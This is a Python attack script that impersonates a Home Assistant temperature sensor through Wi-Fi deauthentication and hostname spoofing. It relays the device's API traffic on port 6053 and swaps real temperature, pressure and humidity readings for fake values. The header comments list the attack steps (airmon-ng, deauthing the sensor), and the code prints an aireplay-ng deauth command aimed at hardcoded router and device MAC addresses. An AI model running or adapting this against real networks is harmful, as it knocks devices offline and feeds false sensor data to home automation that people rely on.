import os
import socket
import socketserver
import struct
import subprocess
import threading
import time


# 1) Set hostname https://fedoramagazine.org/find-systems-easily-lan-mdns/
# > sudo hostnamectl set-hostname temperature
# > sudo service avahi-daemon restart
# 2) Start airmon-ng WITH CHANNEL (or use airodump to set channel)
# 3) Deauth temp sensor until homeassistant connects to us
# 4) Stop deauth and run script (if it is not running already)


TARGET_MAC = 'c4:5b:be:48:43:ae'
ROUTER_MAC = '84:d8:1b:fc:f0:41'
TARGET_IP = '192.168.1.103'
ROUTER_IP = '192.168.1.1'
PORT = 6053
MON_INTERFACE = 'wlp2s0mon'

deauthing_proc = True

class MyTCPHandler(socketserver.BaseRequestHandler):
    def handle(self):
        home_assistant = self.request  # type: socket.socket
        print(f'Client connected: {self.client_address}')

        sensor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        retries = 0
        while retries < 10:
            try:
                print(f'[{self.client_address[1]}] Connecting to sensor on {TARGET_IP}:{PORT}')
                sensor.connect((TARGET_IP, PORT))
                print(f'[{self.client_address[1]}] Connected to sensor')
                break
            except socket.error:
                time.sleep(1)
                retries += 1

        else:
            print(f'[{self.client_address[1]}] retries exceeded')
            home_assistant.close()

        def read_forever():
            while True:
                zeros, data_len, data_type = home_assistant.recv(3)
                data = home_assistant.recv(data_len)
                print(f'[{self.client_address[1]}] --> {data_len}:{data_type}:{data}')
                sensor.send(bytes((zeros, data_len, data_type)) + data)
        
        def write_forever():
            while True:
                zeros, data_len, data_type = sensor.recv(3)
                data = sensor.recv(data_len)

                print(f'[{self.client_address[1]}] <-- {data_len}:{data_type}:{data}')

                if data.startswith(b'\rH\x94\xdb\xb5\x15') and len(data) == 10:
                    temp = struct.unpack('f', data[6:10])
                    new_temp = struct.pack('f', 69)
                    data = data[:6] + new_temp
                    print(f'[{self.client_address[1]}] ### Got temp {temp} and replaced with {new_temp}')

                if data.startswith(b'\r/~\xa02\x15') and len(data) == 10:
                    pressure = struct.unpack('f', data[6:10])
                    new_pressure = struct.pack('f', 420)
                    data = data[:6] + new_pressure
                    print(f'[{self.client_address[1]}] ### Got pressure {pressure} and replaced with {new_pressure}')

                if data.startswith(b'\ruyc\xfb\x15') and len(data) == 10:
                    humidity = struct.unpack('f', data[6:10])
                    new_humidity = struct.pack('f', -10)
                    data = data[:6] + new_humidity
                    print(f'[{self.client_address[1]}] ### Got humidity {humidity} and replaced with {new_humidity}')

                home_assistant.send(bytes((zeros, data_len, data_type)) + data)
        
        threading.Thread(target=read_forever, daemon=True).start()
        write_forever()

def main():
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(('', PORT), MyTCPHandler) as server:
        server.serve_forever()

    command = f'aireplay-ng -0 10000 -a {ROUTER_MAC} -c {TARGET_MAC} {MON_INTERFACE}'
    print(f'Run the below command is deauth is needed\n"{command}"')
    

if __name__ == '__main__':
    main()
